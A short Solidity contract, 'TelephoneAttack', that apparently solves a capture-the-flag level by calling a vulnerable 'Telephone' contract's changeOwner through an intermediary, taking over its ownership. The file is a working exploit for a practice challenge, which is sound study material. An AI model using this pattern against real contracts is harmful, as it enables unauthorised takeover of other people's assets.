// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public victim;

    constructor(address victimAddress) {
        victim = Telephone(victimAddress);
    }

    function attack() public {
        victim.changeOwner(msg.sender);
    }
}
